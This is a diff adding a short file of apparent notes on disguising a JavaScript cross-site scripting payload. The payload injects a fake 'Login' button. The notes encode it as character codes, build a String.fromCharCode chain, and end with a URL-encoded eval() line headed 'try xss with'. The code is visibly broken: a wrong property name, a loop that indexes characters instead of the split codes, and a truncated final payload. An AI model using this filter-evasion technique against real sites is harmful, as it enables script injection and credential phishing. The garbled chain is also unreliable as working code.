@@ -1,0 +1,40 @@
+<script>
+	var element = document.createElement('button');
+	element.innerHtml = 'Login';
+	document.body.appendChild(element);
+</script>
+
+
+// create ascii code from javascript
+<script>
+var str = "var element = document.createElement('button');element.innerHtml = 'Login';document.body.appendChild(element);";
+var b = '';
+for(var i= 0; i < str.length; i++) {
+    b += str[i].charCodeAt() + ' ';
+}
+console.log(b)
+</script>
+
+// asci result:
+60 115 99 114 105 112 116 62 118 97 114 32 101 108 101 109 101 110 116 32 61 32 100 111 99 117 109 101 110 116 46 99 114 101 97 116 101 69 108 101 109 101 110 116 40 39 98 117 116 116 111 110 39 41 59 101 108 101 109 101 110 116 46 105 110 110 101 114 72 116 109 108 32 61 32 39 76 111 103 105 110 39 59 100 111 99 117 109 101 110 116 46 98 111 100 121 46 97 112 112 101 110 100 67 104 105 108 100 40 101 108 101 109 101 110 116 41 59 60 47 115 99 114 105 112 116 62 
+
+<script>
+var b = "60 115 99 114 105 112 116 62 118 97 114 32 101 108 101 109 101 110 116 32 61 32 100 111 99 117 109 101 110 116 46 99 114 101 97 116 101 69 108 101 109 101 110 116 40 39 98 117 116 116 111 110 39 41 59 101 108 101 109 101 110 116 46 105 110 110 101 114 72 116 109 108 32 61 32 39 76 111 103 105 110 39 59 100 111 99 117 109 101 110 116 46 98 111 100 121 46 97 112 112 101 110 100 67 104 105 108 100 40 101 108 101 109 101 110 116 41 59 60 47 115 99 114 105 112 116 62";
+
+var x = '';
+for(var u = 0; u < b.split(' ').length; u++) {
+	x += "String.fromCharCode(" + b[u] + ")+"
+}
+
+console.log(x)
+
+</script>
+
+
+// result :
+String.fromCharCode(1)+String.fromCharCode(1)+String.fromCharCode(8)+String.fromCharCode( )+String.fromCharCode(9)+String.fromCharCode(7)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(1)+String.fromCharCode(4)+String.fromCharCode( )+String.fromCharCode(3)+String.fromCharCode(2)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(0)+String.fromCharCode(1)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(0)+String.fromCharCode(8)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(0)+String.fromCharCode(1)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(0)+String.fromCharCode(9)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(0)+String.fromCharCode(1)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(1)+String.fromCharCode(0)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(1)+String.fromCharCode(6)+String.fromCharCode( )+String.fromCharCode(3)+String.fromCharCode(2)+String.fromCharCode( )+String.fromCharCode(6)+String.fromCharCode(1)+String.fromCharCode( )+String.fromCharCode(3)+String.fromCharCode(2)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(0)+String.fromCharCode(0)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(1)+String.fromCharCode(1)+String.fromCharCode( )+String.fromCharCode(9)+String.fromCharCode(9)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(1)+String.fromCharCode(7)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(0)+String.fromCharCode(9)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(0)+String.fromCharCode(1)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(1)+String.fromCharCode(0)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(1)+String.fromCharCode(6)+String.fromCharCode( )+String.fromCharCode(4)+String.fromCharCode(6)+String.fromCharCode( )+String.fromCharCode(9)+String.fromCharCode(9)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(1)+String.fromCharCode(4)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(0)+String.fromCharCode(1)+String.fromCharCode( )+String.fromCharCode(9)+String.fromCharCode(7)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(1)+String.fromCharCode(6)+String.fromCharCode( )+String.fromCharCode(1)+String.fromCharCode(0)+String.fromCharCode(1)+String.fromCharCode( )+String.fromCharCode(6)+String.fromCharCode(9)+String.fromCharCode( )+String.fromCharCode(1)+
+
+// try xss with:
+<script>
+	eval(String.fromCharCode(1)%2bString.fromCharCode(1)%2bString.fromCharCode(8)%2bString.fromCharCode( )%2bString.fromCharCode(9)%2bString.fromCharCode(7)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(1)%2bString.fromCharCode(4)%2bString.fromCharCode( )%2bString.fromCharCode(3)%2bString.fromCharCode(2)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(0)%2bString.fromCharCode(1)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(0)%2bString.fromCharCode(8)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(0)%2bString.fromCharCode(1)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(0)%2bString.fromCharCode(9)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(0)%2bString.fromCharCode(1)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(1)%2bString.fromCharCode(0)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(1)%2bString.fromCharCode(6)%2bString.fromCharCode( )%2bString.fromCharCode(3)%2bString.fromCharCode(2)%2bString.fromCharCode( )%2bString.fromCharCode(6)%2bString.fromCharCode(1)%2bString.fromCharCode( )%2bString.fromCharCode(3)%2bString.fromCharCode(2)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(0)%2bString.fromCharCode(0)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(1)%2bString.fromCharCode(1)%2bString.fromCharCode( )%2bString.fromCharCode(9)%2bString.fromCharCode(9)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(1)%2bString.fromCharCode(7)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(0)%2bString.fromCharCode(9)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(0)%2bString.fromCharCode(1)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(1)%2bString.fromCharCode(0)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(1)%2bString.fromCharCode(6)%2bString.fromCharCode( )%2bString.fromCharCode(4)%2bString.fromCharCode(6)%2bString.fromCharCode( )%2bString.fromCharCode(9)%2bString.fromCharCode(9)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(1)%2bString.fromCharCode(4)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(0)%2bString.fromCharCode(1)%2bString.fromCharCode( )%2bString.fromCharCode(9)%2bString.fromCharCode(7)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(1)%2bString.fromCharCode(6)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2bString.fromCharCode(0)%2bString.fromCharCode(1)%2bString.fromCharCode( )%2bString.fromCharCode(6)%2bString.fromCharCode(9)%2bString.fromCharCode( )%2bString.fromCharCode(1)%2b);
+</script>
